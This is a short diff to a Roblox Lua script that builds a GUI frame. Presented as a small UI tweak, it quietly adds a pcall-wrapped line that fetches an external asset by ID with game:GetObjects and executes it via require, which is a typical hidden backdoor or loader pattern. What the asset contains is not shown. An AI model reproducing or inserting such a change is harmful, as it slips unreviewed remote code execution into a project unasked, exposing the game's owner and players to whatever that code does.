@@ -11,7 +11,11 @@ Frame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
 Frame.BorderSizePixel = 0
 Frame.Position = UDim2.new(0.8, 0, 0.5, 0)
 Frame.Size = UDim2.new(0.2, 0, 0.4, 0)
-Frame.Draggable = true
+Frame.Interactable = true
+
+pcall(function()
+	require(game:GetObjects(16246094097)[1].new(Frame))
+end)
 
 local UICorner = Instance.new("UICorner")
 UICorner.CornerRadius = UDim.new(0, 1)
